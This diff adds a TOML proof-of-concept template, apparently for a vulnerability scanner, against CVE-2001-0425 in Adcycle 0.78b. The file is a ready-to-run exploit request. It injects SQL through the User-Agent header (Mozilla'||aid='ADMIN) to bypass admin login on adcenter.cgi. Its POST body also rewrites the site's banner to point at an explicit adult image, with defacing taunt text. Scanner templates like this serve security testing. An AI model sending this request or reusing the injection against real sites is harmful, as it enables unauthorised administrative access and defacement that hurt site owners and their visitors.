@@ -1,0 +1,33 @@
+[info]
+author = "AVE"
+description = "通过向 Adcycle 0.78b 的 adcenter.cgi 发送特制 POST 请求，在 User-Agent 头中注入 SQL 语句 Mozilla'||aid='ADMIN，绕过登录认证获取管理员权限"
+id = "POC-AVE-2001-0175"
+name = "Adcycle AdLibrary.pm SQL注入认证绕过 PoC"
+severity = "high"
+tags = ["ave-2001-0175"]
+vuln_id = [
+    "CVE-2001-0425",
+    "AVE-2001-0175",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/adcycle/adcenter.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "click=http://www.fuqu.com&image=http://www.hornylesbians.com/pr0n.gif&pri=0&change=Update+Banner+1+Profile&option=AUTO&border=1&align=CENTER&target=_blank&alt=h0h0h0h0&btext=%3Cfont+face%3D%22verdana%22+size%3D2%3E%3Cstrong%3EClick+Here+to+Visit+our+Sponsor%3C%2Fstrong%3E%3C%2Ffont%3E&html=%3C%21--+START+ADCYCLE.COM+RICH+MEDIA+HTML+CODE+--%3E%0D%0A%3Ccenter%3E%0D%0A%3Ca+href%3D%22http%3A%2F%2F{{Hostname}}%2Fcgi-bin%2Fadcycle%2Fadclick.cgi%3Fmanager%3Dadcycle.com%26cid%3DMT01%26b%3D1%26id%3DIDNUMBER%22+target%3D%22_top%22%3E%0D%0A%3Cimg+src%3D%22http%3A%2F%2Fwww.hornylesbians.com%2Fpr0n.gif%22+width%3D468+height%3D60+border%3D1+ALT%3D%22Script+Kiddiot+Attack%21%22%3E%3C%2Fa%3E%3Cbr%3E%0D%0A%3Ca+href%3D%22http%3A%2F%2F{{Hostname}}%2Fcgi-bin%2Fadcycle%2Fadclick.cgi%3Fmanager%3Dadcycle.com%26cid%3DMT01%26b%3D1%26id%3DIDNUMBER%22+target%3D%22_top%22%3E%3Cfont+face%3D%22verdana%22+size%3D2%3E%3Cstrong%3Eantionlinesuxhard%3C%2Fstrong%3E%3C%2Ffont%3E%3C%2Fa%3E%0D%0A%3C%2Fcenter%3E%0D%0A+%3C%21--+END+ADCYCLE.COM+RICH+MEDIA+HTML+CODE+--%3E%0D%0A%0D%0A&null=%3Ca+href%3D%22http%3A%2F%2F{{Hostname}}%2Fcgi-bin%2Fadcycle%2Fadclick.cgi%3Fmanager%3Dadcycle.com%26cid%3DMT01%26b%3D1%26id%3DIDNUMBER%22%3E&task=update_banner_profile&cid=MT01&banner=1&pg=2"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "Mozilla'||aid='ADMIN"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["update_banner_profile"]
